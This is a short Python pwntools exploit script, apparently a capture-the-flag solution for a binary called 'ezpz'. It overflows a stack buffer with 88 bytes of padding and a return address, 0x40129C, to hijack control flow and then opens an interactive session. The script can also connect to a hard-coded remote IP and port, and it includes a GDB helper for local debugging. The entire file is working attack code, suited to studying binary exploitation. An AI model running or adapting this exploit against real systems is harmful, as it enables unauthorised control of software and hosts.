#!/usr/bin/python3

from pwn import *

exe = ELF('ezpz', checksec=False)

context.binary = exe

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)
sln = lambda msg, num: sla(msg, str(num).encode())
sn = lambda msg, num: sa(msg, str(num).encode())

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b*0x4012B0

        c
        ''')
        input()


if args.REMOTE:
    p = remote('165.227.103.166', 6002)
else:
    p = process(exe.path)
GDB()

sla(b'proud?', b'a'*88 + flat(0X40129C))

p.interactive()
